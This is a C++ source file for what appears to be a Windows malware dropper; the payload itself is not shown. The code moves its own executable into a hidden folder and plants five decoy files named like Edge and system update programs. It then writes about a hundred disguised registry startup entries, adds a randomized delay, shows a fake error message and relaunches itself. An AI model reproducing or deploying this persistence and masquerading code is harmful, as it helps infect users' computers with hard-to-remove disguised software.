#include <Windows.h>
#include <chrono>
#include <thread>
#include <random>

#include "main.hpp"
#include "shared.hpp"
#include "utils/_utils.hpp"
#include "utils/_startup.h"
#include "utils/_files.h"

using namespace std;

void closeMutex(HANDLE mutex) {
	if (mutex) CloseHandle(mutex);
}

int WINAPI wWinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PWSTR pCmdLine,
	int nCmdShow
) {
	HANDLE mutex = CreateMutexW(
		NULL, TRUE,
		shared::MUTEX_KEY
	);

	DWORD error = GetLastError();
	if (error == ERROR_ALREADY_EXISTS) {
		closeMutex(mutex);
		return 0;
	}

	std::random_device rd;
	std::mt19937 gen(rd());

	wchar_t execPath[MAX_PATH];
	GetModuleFileNameW(NULL, execPath, MAX_PATH);
	wstring execPathStr = execPath;

	if (wstring(pCmdLine).find(shared::RUN_KEY) != wstring::npos) {
		if (execPathStr.find(shared::REAL_FOLDER) == wstring::npos) {
			MessageBoxA(
				NULL,
				"Critical Error 0x7FC39.",
				"Error",
				MB_OK | MB_ICONERROR
			);

			closeMutex(mutex);

			return 1;
		}

		std::uniform_int_distribution<> disSleep(35, 120);
		std::this_thread::sleep_for(
			std::chrono::seconds(disSleep(gen))
		);

		MessageBoxA(
			NULL,
			"uhh something should happen idk",
			"yippie",
			MB_OK
		);

		main::main();

		closeMutex(mutex);

		return 0;
	}

	bool checkedFake = files::checkFolder(shared::FAKE_FOLDER);
	bool checkedReal = files::checkFolder(shared::REAL_FOLDER);

	if (checkedReal && checkedFake) {
		closeMutex(mutex);
		return 1;
	}

	wstring fakeFolder = files::createFolder(shared::FAKE_FOLDER);
	wstring realFolder = files::createFolder(shared::REAL_FOLDER);

	wstring newExecPath = realFolder + L"\\" + shared::PROC_NAME;
	MoveFileW(execPath, newExecPath.c_str());

	WIN32_FILE_ATTRIBUTE_DATA data;
	GetFileAttributesExW(execPath, GetFileExInfoStandard, &data);

	LARGE_INTEGER size;
	size.HighPart = data.nFileSizeHigh;
	size.LowPart = data.nFileSizeLow;

	size_t base = size.QuadPart;

	std::vector<wstring> files;
	files.reserve(5);

	std::uniform_int_distribution<> disSize(50, 200);

	for (const wstring& name : {
		L"Edge Broker Executable.exe",
		L"Edge Crash Handler.exe",
		L"Update Provision Linker.exe",
		L"Runtime Coms Link.exe",
		L"System Update Resync.exe"
	}) {
		size_t newSize = base * disSize(gen) / 100;
		unique_ptr<wstring> content = make_unique<wstring>(newSize, L'A');

		wstring file = files::createFile(fakeFolder, name, *content);
		if (!file.empty())
			files.push_back(file);
	}

	std::uniform_int_distribution<> disFile(0, (int)files.size() - 1);

	for (int i = 0; i < 100; ++i) {
		string name = utils::repeatString(shared::STARTUP_PREFIX, 13) + startup::genSuffix(i);

		wstring file = files[disFile(gen)];
		wstring data = L"cmd.exe /c start \"\" \"" + file + L"\"";

		startup::createRegKey(name, data);
	}

	string name = utils::repeatString(shared::STARTUP_PREFIX, 13) + startup::genSuffix(105);
	wstring rData = L"cmd.exe /c start \"\" \"" + newExecPath + L"\" " + shared::RUN_KEY;
	startup::createRegKey(name, rData);

	wstring arg = L"\"" + newExecPath + L"\" " + shared::RUN_KEY;

	STARTUPINFOW start = { sizeof(start) };
	PROCESS_INFORMATION info = {};

	BOOL success = CreateProcessW(
		NULL, &arg[0], NULL,
		NULL, FALSE, NULL,
		NULL, NULL, &start,
		&info
	);

	if (success) {
		CloseHandle(info.hProcess);
		CloseHandle(info.hThread);
	}

	closeMutex(mutex);

	return 0;
}